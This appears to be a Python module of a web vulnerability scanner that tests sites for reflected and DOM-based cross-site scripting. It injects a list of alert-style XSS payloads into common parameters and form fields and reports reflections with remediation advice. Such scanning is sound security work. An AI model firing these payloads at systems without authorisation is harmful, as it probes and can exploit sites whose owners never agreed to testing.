import re
from modules.base import BaseModule


class XssModule(BaseModule):
    NAME = "xss"
    DESCRIPTION = "XSS testing - reflected, stored indicators, DOM-based patterns"

    PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "\"'><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<input autofocus onfocus=alert('XSS')>",
        "';alert('XSS');//",
        "<details open ontoggle=alert('XSS')>",
        "<video><source onerror=alert('XSS')>",
        "<<SCRIPT>alert('XSS')//<</SCRIPT>",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;",
    ]

    COMMON_PARAMS = ["q", "search", "s", "query", "name", "comment",
                     "message", "content", "title", "url", "redirect",
                     "next", "return", "lang", "ref", "page"]

    def run(self):
        self.log.info("[xss] Testing for reflected XSS")
        self._test_reflected()
        self._test_forms()
        self._check_dom_sinks()

    def _test_reflected(self):
        for url in self._candidate_pages():
            for param in self.COMMON_PARAMS:
                for payload in self.PAYLOADS[:6]:  # Top payloads just for speed
                    resp = self.get(url, params={param: payload})
                    if resp and payload in resp.text:
                        self.add_finding(
                            severity="HIGH",
                            title="Reflected XSS",
                            url=url,
                            detail=f"Payload reflected verbatim in parameter '{param}'.",
                            payload=payload,
                            evidence=self._extract_context(resp.text, payload),
                            remediation="Escape all user-supplied output; implement a strict CSP.",
                        )
                        break

    def _test_forms(self):
        for form in self._crawl_forms():
            for payload in self.PAYLOADS[:4]:
                data = {field: payload for field in form["inputs"]}
                target_url = form["action"]
                r = self.post(target_url, data=data) if form["method"] == "post" \
                    else self.get(target_url, params=data)
                if r and payload in r.text:
                    self.add_finding(
                        severity="HIGH",
                        title="Reflected XSS via form",
                        url=target_url,
                        detail=f"Form at '{target_url}' reflects XSS payload.",
                        payload=payload,
                        remediation="Escape all user-supplied output; implement a strict CSP.",
                    )
                    break

        # Fallback: discover forms in the homepage when the crawl module was not run.
        resp = self.get(self.target)
        if not resp:
            return
        forms = self._parse_forms(resp.text)
        for form in forms[:5]:
            for payload in self.PAYLOADS[:4]:
                data = {field: payload for field in form["inputs"]}
                target_url = self.url(form["action"])
                r = self.post(target_url, data=data) if form["method"] == "post" \
                    else self.get(target_url, params=data)
                if r and payload in r.text:
                    self.add_finding(
                        severity="HIGH",
                        title="Reflected XSS via form",
                        url=target_url,
                        detail=f"Form at '{form['action']}' reflects XSS payload.",
                        payload=payload,
                        remediation="Escape all user-supplied output; implement a strict CSP.",
                    )
                    break

    def _check_dom_sinks(self):
        """Heuristic check for dangerous DOM sinks in page source."""
        for url in self._candidate_pages()[:10]:
            resp = self.get(url)
            if not resp:
                continue
            sinks = [
                "document.write(", "innerHTML", "outerHTML",
                "eval(", "setTimeout(", "setInterval(",
                "location.href =", "document.domain",
            ]
            sources = ["location.search", "location.hash", "location.href",
                       "document.referrer", "document.URL", "window.name"]
            found_sinks   = [s for s in sinks   if s in resp.text]
            found_sources = [s for s in sources if s in resp.text]

            if found_sinks and found_sources:
                self.add_finding(
                    severity="MEDIUM",
                    title="Potential DOM-based XSS sinks detected",
                    url=url,
                    detail=(f"Dangerous sinks: {found_sinks} | "
                            f"User-controlled sources: {found_sources}"),
                    remediation="Audit JavaScript for unsafe DOM manipulation of user data.",
                )

    def _parse_forms(self, html: str) -> list:
        forms = []
        for form_html in re.findall(r"<form[^>]*>.*?</form>", html, re.I | re.S):
            action = re.search(r'action=["\']([^"\']*)["\']', form_html, re.I)
            method = re.search(r'method=["\']([^"\']*)["\']', form_html, re.I)
            inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', form_html, re.I)
            forms.append({
                "action": action.group(1) if action else "/",
                "method": (method.group(1) if method else "get").lower(),
                "inputs": inputs,
            })
        return forms

    def _extract_context(self, body: str, payload: str, window: int = 100) -> str:
        idx = body.find(payload)
        if idx == -1:
            return ""
        return body[max(0, idx - 30): idx + len(payload) + 30]

    def _candidate_pages(self):
        crawl = self.results.meta.get("crawl", {})
        urls = [page.get("url") for page in crawl.get("pages", []) if page.get("url")]
        urls.append(self.target)
        out = []
        seen = set()
        for url in urls:
            if url not in seen:
                seen.add(url)
                out.append(url)
        return out[:20]

    def _crawl_forms(self):
        crawl = self.results.meta.get("crawl", {})
        forms = []
        for form in crawl.get("forms", []):
            method = form.get("method", "get").lower()
            if method not in ("get", "post"):
                method = "get"
            forms.append({
                "action": form.get("action") or self.target,
                "method": method,
                "inputs": form.get("inputs", []),
            })
        return forms[:10]
